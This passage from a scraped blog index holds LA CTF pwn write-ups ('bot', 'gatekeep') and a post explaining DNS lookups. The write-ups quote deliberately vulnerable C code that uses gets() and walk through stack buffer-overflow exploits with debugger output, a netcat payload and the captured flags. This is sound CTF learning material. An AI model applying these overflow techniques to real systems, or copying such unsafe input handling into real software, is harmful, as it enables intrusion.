Opening connection to lac.tf on port 31180: Done [*] Switching to interactive mode hi, how can i help? lol no lactf{hey_stop_bullying_my_bot_thats_not_nice} Conclusion Noticing how strcmp works and creating a payload that exploits that characteristic was important. Thanks for reading!\n","permalink":"https://joonkim0625.github.io/posts/2023-2-14-la-ctf-pwn-bot/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eI made a bot to automatically answer all of your questions.\u003c/p\u003e\n\u003cp\u003enc lac.tf 31180\u003c/p\u003e\n\u003ch2 id=\"my-approach\"\u003eMy approach\u003c/h2\u003e\n\u003cp\u003eAgain, the source code, its binary, and the Dockerfile were given. Looking at the\nsour code code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003esetbuf\u003c/span\u003e(stdout, NULL);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e input[\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evolatile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e give_flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hi, how can i help?\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003egets\u003c/span\u003e(input);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estrcmp\u003c/span\u003e(input, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;give me the flag\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;lol no\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estrcmp\u003c/span\u003e(input, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;please give me the flag\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estrcmp\u003c/span\u003e(input, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;help, i have no idea how to solve this\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;L\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estrcmp\u003c/span\u003e(input, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;may i have the flag?\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;not with that attitude\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estrcmp\u003c/span\u003e(input, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;please please please give me the flag\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;i\u0026#39;ll consider it\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esleep\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (give_flag) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ok here\u0026#39;s your flag\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003esystem\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cat flag.txt\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sorry, i didn\u0026#39;t understand your question\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAfter looking at the source code, I noticed that there is a \u003ccode\u003egive_flag\u003c/code\u003e variable\nand a buffer that we can overflow since the user input is received with\n\u003ccode\u003egets()\u003c/code\u003e. Unlike the previous challenge I worked on, \u003ccode\u003egive_flag\u003c/code\u003e variable would\nalways be located after the buffer \u003ccode\u003einput\u003c/code\u003e so we won\u0026rsquo;t be able to modify the\nvalue of \u003ccode\u003egive_flag\u003c/code\u003e this time.\u003c/p\u003e","title":"LA CTF - pwn: bot"},{"content":"What happens if a web browser (client) sends a reqeust to a server? Reference\nWhat is DNS (Domain Name System)?\nDNS resolves names domain names to IP addresses Steps that DNS takes:\nWe try to access yahoo.com in our browser The browser (or your OS) checks its own cache memory for IP Address if not found, it sends the query to the resolver server The resolver server is basically your ISP (Internet service provider) Once it receives the query, it checks its own cache memory to find the IP address to yahoo.com if not found, it sends the query to the root server Root server is the top, or the root, of the DNS hierarchy 13 sets of these root servers strategically placed around the world operated by 12 different organizations each set has their own unique IP address when the root server receives the query for the IP address for yahoo.com, it is not going to know what the IP address is. But, it knows where to send the resolver to find the IP address. The root server will direct the resolver to the TLD (Top Level Domain server) server for the .com domain Top Level Domain Server stores the address information for top level domains such as .com, .net, .org etc. TLD server is not going to know what the IP address for yahoo.com. So it will direct the resolver to the next and final level which are the Authoritative Name servers The resolver asks the authoritative name server for the IP address for yahoo.com Authoritative Name Servers are responsible for knowing everything about the domain including the IP address when it receives for the query from the resolver, the name server responds with the IP address for yahoo.com Finally, the resolver tells your computer the IP address for yahoo.com and your computer now can retrieve the web page for yahoo.com once the resolver receives the IP address for yahoo.com, it will store the IP address in its cache memory to prevent going through all these steps again After the steps above\u0026hellip;\nThen the browser requests passes through a Web Application Firewall Them the request passes through a Load Balancer Then it connects to the webserver on port 80 (http) or 443 (https) Then the web application talks to database Your browser renders the HTML into a viewable website ","permalink":"https://joonkim0625.github.io/posts/2023-2-14-dns-and-webbrowser-request/","summary":"\u003ch2 id=\"what-happens-if-a-web-browser-client-sends-a-reqeust-to-a-server\"\u003eWhat happens if a web browser (client) sends a reqeust to a server?\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://www.youtube.com/watch?v=mpQZVYPuDGU\"\u003eReference\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWhat is DNS (Domain Name System)?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDNS resolves names domain names to IP addresses\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSteps that DNS takes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003col\u003e\n\u003cli\u003eWe try to access \u003ccode\u003eyahoo.com\u003c/code\u003e in our browser\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eThe browser (or your OS) checks its own cache memory for IP Address\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eif not found, it sends the query to the resolver server\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eThe resolver server is basically your ISP (Internet service provider)\u003c/li\u003e\n\u003cli\u003eOnce it receives the query, it checks its own cache memory to find the IP\naddress to \u003ccode\u003eyahoo.com\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003eif not found, it sends the query to the root server\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eRoot server is the top, or the root, of the DNS hierarchy\u003c/li\u003e\n\u003cli\u003e13 sets of these root servers strategically placed around the world\u003c/li\u003e\n\u003cli\u003eoperated by 12 different organizations\u003c/li\u003e\n\u003cli\u003eeach set has their own unique IP address\u003c/li\u003e\n\u003cli\u003ewhen the root server receives the query for the IP address for\n\u003ccode\u003eyahoo.com\u003c/code\u003e, it is not going to know what the IP address is. But, it\nknows where to send the resolver to find the IP address. The root server\nwill direct the resolver to the TLD (Top Level Domain server) server for\nthe \u003ccode\u003e.com\u003c/code\u003e domain\u003c/li\u003e\n\u003cli\u003eTop Level Domain Server stores the address information for top level\ndomains such as \u003ccode\u003e.com\u003c/code\u003e, \u003ccode\u003e.net\u003c/code\u003e, \u003ccode\u003e.org\u003c/code\u003e etc.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003eTLD server is not going to know what the IP address for \u003ccode\u003eyahoo.com\u003c/code\u003e. So\nit will direct the resolver to the next and final level which\nare the Authoritative Name servers\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003col start=\"6\"\u003e\n\u003cli\u003eThe resolver asks the authoritative name server for the IP address for\n\u003ccode\u003eyahoo.com\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eAuthoritative Name Servers are responsible for knowing everything about\nthe domain including the IP address\u003c/li\u003e\n\u003cli\u003ewhen it receives for the query from the resolver, the name server responds\nwith the IP address for \u003ccode\u003eyahoo.com\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003col start=\"7\"\u003e\n\u003cli\u003eFinally, the resolver tells your computer the IP address for \u003ccode\u003eyahoo.com\u003c/code\u003e\nand your computer now can retrieve the web page for \u003ccode\u003eyahoo.com\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eonce the resolver receives the IP address for \u003ccode\u003eyahoo.com\u003c/code\u003e, it will store\nthe IP address in its cache memory to prevent going through all these\nsteps again\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAfter the steps above\u0026hellip;\u003c/p\u003e","title":"DNS \u0026 Web Browser Request"},{"content":"Description If I gaslight you enough, you won\u0026rsquo;t be able to get my flag! :)\nnc lac.tf 31121\nNote: The attached binary is the exact same as the one executing on the remote server.\nSource code The source code, its binary, and the Dockerfile were given. Looking at the sour code code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; void print_flag() { char flag[256]; FILE* flagfile = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (flagfile == NULL) { puts(\u0026#34;Cannot read flag.txt.\u0026#34;); } else { fgets(flag, 256, flagfile); flag[strcspn(flag, \u0026#34;\\n\u0026#34;)] = \u0026#39;\\0\u0026#39;; puts(flag); } } int check(){ char input[15]; char pass[10]; int access = 0; // If my password is random, I can gatekeep my flag! :) int data = open(\u0026#34;/dev/urandom\u0026#34;, O_RDONLY); if (data \u0026lt; 0) { printf(\u0026#34;Can\u0026#39;t access /dev/urandom.\\n\u0026#34;); exit(1); } else { ssize_t result = read(data, pass, sizeof pass); if (result \u0026lt; 0) { printf(\u0026#34;Data not received from /dev/urandom\\n\u0026#34;); exit(1); } } close(data); printf(\u0026#34;Password:\\n\u0026#34;); gets(input); if(strcmp(input, pass)) { printf(\u0026#34;I swore that was the right password ...\\n\u0026#34;); } else { access = 1; } if(access) { printf(\u0026#34;Guess I couldn\u0026#39;t gaslight you!\\n\u0026#34;); print_flag(); } } int main(){ setbuf(stdout, NULL); printf(\u0026#34;If I gaslight you enough, you won\u0026#39;t be able to guess my password! :)\\n\u0026#34;); check(); return 0; } within check(), the password is being stored into a buffer using gets(). So I immediately thought that if I can control the return address of check() function to print_flag(), then we can get the flag. I checked the security properties of this binary by running pwn checksec --file=./gatekeep.\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Although these security features are enabled, this challenge can be as easy as overwriting access variable by overflowing the buffer. Although this challenge seems to be an easy one, we want to know why this works. One can question that how can a buffer that is declared before access variable can overwrite a variable that is declared after the buffer? Because input is declared first within the stack frame, it would be located at a higher address (the stack grows from the higher address to the lower address) and access would be located at a lower address. And when a buffer is filled, it would start from the lower address (so the beginning of the buffer) and it grows to the higher address. So it seems like it is impossible to overwrite access variable. But what we need to consider is how the compiler puts things onto the stack. Due to all the techniques and reasons, the compiler ends up placing access before input buffer. If we take a look at this program in GDB, we can check the addresses of these variables.\n0x5555555552f9 \u0026lt;check+165\u0026gt; mov rsi, rdx 0x5555555552fc \u0026lt;check+168\u0026gt; mov rdi, rax ► 0x5555555552ff \u0026lt;check+171\u0026gt; call strcmp@plt \u0026lt;strcmp@plt\u0026gt; s1: 0x7fffffffdcf1 ◂— 0x2000000061616161 /* \u0026#39;aaaa\u0026#39; */ s2: 0x7fffffffdce7 ◂— 0x2aa7c1bf24aa3127 This is the comparison between pass and input variable. input gets moved into rdi register as it is the first argument to strcmp function (and you can see the input aaaa). The address that aaaa is stored is at 0x7fffffffdcf1. This is the address of input buffer.\nNow, we will see where access is located at:\n0x55555555531d \u0026lt;check+201\u0026gt; cmp dword ptr [rbp - 4], 0 0x555555555321 \u0026lt;check+205\u0026gt; je check+229 \u0026lt;check+229\u0026gt; This is the comparison (or if statement) where it is checking whether access is 0 or some value:\nif(access) { printf(\u0026#34;Guess I couldn\u0026#39;t gaslight you!\\n\u0026#34;); // more code... We can see that the value of access is at rbp - 4. Let\u0026rsquo;s print the address of rbp - 4:\npwndbg\u0026gt; p $rbp - 4 $1 = (void *) 0x7fffffffdd0c If we compare the two addresses (access and input), we can see which one is declared first. If we do 0x7fffffffdd0c - 0x7fffffffdcf1, we get:\npwndbg\u0026gt; p 0x7fffffffdd0c - 0x7fffffffdcf1 $2 = 27 This tells us that 0x7fffffffdd0c which is the address to the value of access is located at a higher memory address (meaning it was put onto the stack first). So now we can simply overflow the buffer to affect the value of this access variable. Since the distance between the two variables are 27 bytes, I passed in 28 bytes of input to the program:\n└─$ python -c \u0026#39;print(\u0026#34;A\u0026#34;*28)\u0026#39; | nc lac.tf 31121 If I gaslight you enough, you won\u0026#39;t be able to guess my password! :) Password: I swore that was the right password ... Guess I couldn\u0026#39;t gaslight you! lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP} One might of gotten the flag by just trying to overflow the buffer but I think it is always good to know why something works in such a way. Thanks for reading!\n","permalink":"https://joonkim0625.github.io/posts/2023-2-13-la-ctf-pwn-gatekeep/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eIf I gaslight you enough, you won\u0026rsquo;t be able to get my flag! :)\u003c/p\u003e\n\u003cp\u003enc lac.tf 31121\u003c/p\u003e\n\u003cp\u003eNote: The attached binary is the exact same as the one executing on the remote server.\u003c/p\u003e\n\u003ch2 id=\"source-code\"\u003eSource code\u003c/h2\u003e\n\u003cp\u003eThe source code, its binary, and the Dockerfile were given. Looking at the\nsour code code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;fcntl.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eprint_flag\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e flag[\u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    FILE\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e flagfile \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efopen\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;flag.txt\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (flagfile \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e NULL) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Cannot read flag.txt.\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003efgets\u003c/span\u003e(flag, \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e, flagfile);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        flag[\u003cspan style=\"color:#a6e22e\"\u003estrcspn\u003c/span\u003e(flag, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(flag);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echeck\u003c/span\u003e(){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e input[\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e pass[\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e access \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// If my password is random, I can gatekeep my flag! :)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eopen\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/dev/urandom\u0026#34;\u003c/span\u003e, O_RDONLY);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (data \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan 